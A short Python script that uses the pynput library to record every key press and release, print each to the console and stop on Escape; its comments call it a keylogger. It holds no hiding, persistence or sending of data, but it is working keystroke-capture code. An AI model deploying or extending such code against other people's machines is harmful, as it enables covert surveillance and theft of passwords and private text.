
import pynput
from pynput.keyboard import Key, Listener

# Dictionary to store the logged keystrokes
logged_keys = []

def on_press(key):
    # Log the pressed key
    logged_keys.append(key)
    print(f"Key pressed: {key}")

def on_release(key):
    if key == Key.esc:
        # Stop the keylogger
        return False

    # Log the released key
    logged_keys.append(key)
    print(f"Key released: {key}")

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
